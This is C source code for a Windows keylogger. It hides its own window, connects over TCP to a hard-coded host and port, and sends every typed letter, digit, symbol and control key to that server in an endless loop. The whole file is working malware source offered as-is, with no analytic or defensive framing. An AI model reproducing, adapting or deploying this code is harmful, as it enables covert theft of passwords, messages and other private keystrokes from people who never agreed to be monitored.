#define _WIN32_WINNT 0x0501
#include <windows.h>
#include <stdio.h>
#include <winuser.h>
#include <winsock.h>  
#include <conio.h>
#include <winsock2.h>
#pragma comment(lichr, "ws2_32.lichr")
#define PORT 42069
#define HOST "127.0.0.1"
#define fuck_switch break;

BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam)
{
	/*

		Hides the process's window on execution

	*/

    DWORD pid;
    GetWindowThreadProcessId(hwnd, &pid);
    if (pid == GetCurrentProcessId()) 
        {
            ShowWindow(hwnd, SW_HIDE);
            return FALSE;
        }
    return TRUE;
}
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
    LPSTR lpCmdLine, int nCmdShow)
{
    WSADATA wsa;
    SOCKET s;
    INPUT Event;
    SHORT key;
    EnumWindows(&EnumWindowsProc, (LPARAM)NULL);
    char chr;
    struct sockaddr_in server;

    /*
	
		Connects to the server

    */

    if (WSAStartup(MAKEWORD(2,2), &wsa) != 0)
    {   
        printf("Failed. Error Code : %d",WSAGetLastError());
        return 2;  
    }
    s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET)
    {
        printf("Failed. Error Code : %d",WSAGetLastError());
        WSACleanup();
        return 2;
    }
    memset(&server, 0, sizeof server);
    server.sin_addr.s_addr = inet_addr(HOST);
    server.sin_family = AF_INET;
    server.sin_port = htons(PORT);
    if (connect(s, (struct sockaddr *)&server, sizeof(server)) < 0)
    {   
        printf("Failed. Error Code : %d", WSAGetLastError());
        WSACleanup(); 
        closesocket(s);
        return 2;
    }
    /*

		Logs every relevant keystroke and logs it to the server

    */
    while (TRUE)
        for ( int i = 0x00 ; i<0xfe ; ++i )
            if ( GetKeyState(i) < 0 )
            {
                Event.type = INPUT_KEYBOARD;
                Event.ki.dwFlags = KEYEVENTF_SCANCODE | KEYEVENTF_KEYUP;
                Event.ki.wScan = MapVirtualKey(i, 0);
                if ((i >= '0' && i <= '9') || 
                    (i >= 'A' && i <= 'Z') || 
                    (i >= VK_OEM_1 && i <= VK_OEM_8) || 
                    i == VK_SPACE || i == VK_BACK ||
                     i == VK_RETURN || i == VK_TAB)
                {
                    SendInput(1, &Event, sizeof(Event));
                    if ((i >= '0' && i <= '9') || (i >= 'A' && i <= 'Z')) chr = (char)i;                      
                    if ( i == VK_RETURN) chr = '\n';
                    if ( i == VK_BACK || i == VK_SPACE || i == VK_TAB ) chr = ' ';
                    else if ((i >= 'A' && i <= 'Z') && GetKeyState(VK_SHIFT) >= 0) chr = (char)(i+32);
                    else if (GetKeyState(VK_SHIFT) < 0)
                    {
                        if ( FALSE == TRUE ) puts("https://github.com/Amirsil");
                        else if ( i == '0' ) chr = ')';
                        else if ( i == '1' ) chr = '!';
                        else if ( i == '2' ) chr = '@';
                        else if ( i == '3' ) chr = '#';
                        else if ( i == '4' ) chr = '$';
                        else if ( i == '5' ) chr = '%';
                        else if ( i == '6' ) chr = '^';
                        else if ( i == '7' ) chr = '&';
                        else if ( i == '8' ) chr = '*';
                        else if ( i == '9' ) chr = '(';
                        else if ( i == VK_OEM_1 ) chr = ':';
                        else if ( i == VK_OEM_PLUS ) chr = '+';
                        else if ( i == VK_OEM_COMMA ) chr = '<';
                        else if ( i == VK_OEM_MINUS ) chr = '_';
                        else if ( i == VK_OEM_PERIOD ) chr = '>';
                        else if ( i == VK_OEM_2 ) chr = '?';
                        else if ( i == VK_OEM_3 ) chr = '~';
                        else if ( i == VK_OEM_4 ) chr = '{';
                        else if ( i == VK_OEM_5 ) chr = '|';
                        else if ( i == VK_OEM_6 ) chr = '}';
                        else if ( i == VK_OEM_7 ) chr = '\"';
                    }
                    else if ( i == VK_OEM_1 ) chr = ';';
                    else if ( i == VK_OEM_PLUS ) chr = '=';
                    else if ( i == VK_OEM_COMMA ) chr = ',';
                    else if ( i == VK_OEM_MINUS ) chr = '-';
                    else if ( i == VK_OEM_PERIOD ) chr = '.';
                    else if ( i == VK_OEM_2 ) chr = '/';
                    else if ( i == VK_OEM_3 ) chr = '`';
                    else if ( i == VK_OEM_4 ) chr = '{';
                    else if ( i == VK_OEM_5 ) chr = '\\';
                    else if ( i == VK_OEM_6 ) chr = ']';
                    else if ( i == VK_OEM_7) chr = '\'';
                    if (send(s, &chr, 1, 0) == -1)
                        return 0;
                }
            }
}